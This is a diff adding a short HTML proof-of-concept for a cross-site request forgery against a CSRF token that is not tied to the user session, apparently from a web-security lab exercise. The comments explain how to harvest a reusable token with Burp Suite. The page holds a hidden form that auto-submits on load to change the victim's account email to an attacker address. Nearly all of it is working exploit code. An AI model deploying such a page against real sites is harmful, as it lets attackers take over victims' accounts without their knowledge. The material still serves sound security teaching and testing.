@@ -1,0 +1,18 @@
+# This is a Proof of Concept of a CSRF Token not tied to user session
+# In this example, the csrf is not linked to the account but it has only one use. To get one, intercept a request with burpsuite, copy the csrf value and discard the request.
+
+<html>
+  <body>
+    <form action="https://page.net/my-account/change-email" method="POST">
+      
+      <input type="hidden" name="email" value="hacked@hacked.com">
+      
+      <input type="hidden" name="csrf" value="V4qY7RvwFI9W1Jq3QVtC7GneUnbhIlFb">
+
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
